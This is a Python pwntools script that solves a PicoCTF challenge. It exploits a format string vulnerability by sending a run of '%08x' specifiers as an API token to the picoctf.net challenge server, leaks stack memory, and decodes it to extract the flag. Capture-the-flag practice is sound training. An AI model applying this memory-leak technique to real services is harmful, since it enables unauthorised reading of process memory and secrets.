#!/usr/bin/env python3
# coding: utf-8

from pwn import *
import binascii
import struct
import array

context.log_level = 'info'

USER_INPUT_1 = b'1\n'
USER_INPUT_2 = 24 * b'|%08x' + b'\n'

def get_user_buf(conn):
    '''
    Send input to the webserver, receive back our API token.

    In the intended case, this will be the same API token we provided. Since we
    are triggering a format string vulnerability, we will get back the value at
    the arbitrary address we are reading.
    '''

    # Receive data until we see the following, then send our data.
    conn.sendafter(b'2) View my portfolio\n', USER_INPUT_1)
    conn.sendafter(b'What is your API token?\n', USER_INPUT_2)
    conn.recvuntil(b"Buying stonks with token:\n")

    # This should be our API token (or our arbitrary read).
    token = conn.recvline()
    return token


def decode_hex(hex_string):
    '''
    The hex we receive is little endian, so we need to swap and pack it.

    Returns the packed string as a byte string. This contains the flag.
    '''
    packed_str = b''

    # There is a trailing newline character making this an odd-length byte
    # string, so we trim it.
    hex_string = hex_string[:-1].decode()
    # Break up each byte and convert to hex, then pack.
    bytes = hex_string.split('|')
    for byte in bytes:
        try:
            hex = int(byte, 16)
            packed_str += p32(hex, endian='little')
        except:
            pass

    return packed_str


def main():
    '''Returns the flag.
    '''
    # Initiate a connection to the PicoCTF server.
    conn = remote('mercury.picoctf.net', 53437)

    # Get the user buffer returned from the server.
    user_buf = get_user_buf(conn)
    log.debug(f'Our API token is: {user_buf.decode()}.')

    # Get the bytes and decode the results.
    flag = decode_hex(user_buf).decode('ascii', errors='ignore')

    # Trim it to just get the flag and not any of the other bytes.
    flag = flag[flag.find('pico') : flag.find('}') + 1]

    log.success(f'Flag: {flag}')
    return flag


if __name__ == '__main__':
    main()

